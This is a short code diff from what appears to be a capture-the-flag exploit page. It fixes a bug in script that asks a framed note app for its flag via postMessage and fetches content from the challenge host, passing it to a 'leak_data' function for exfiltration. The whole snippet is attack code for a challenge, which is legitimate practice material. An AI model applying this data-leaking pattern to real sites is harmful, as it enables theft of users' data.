@@ -16,8 +16,8 @@
                 });
                 let target = document.getElementById("target");
                 target.contentWindow.postMessage("NOTE_APP_FLAG_REQUEST", "*");
-                fetch("https://chall1.jsapi.tech").then((response) => {leak_data(response.text);});
-                fetch("https://chall1.jsapi.tech/script.js").then((response) => {leak_data(response.text);});
+                fetch("https://chall1.jsapi.tech").then((response) => {leak_data(response.text());});
+                fetch("https://chall1.jsapi.tech/script.js").then((response) => {leak_data(response.text());});
             }
         </script>
     </head>
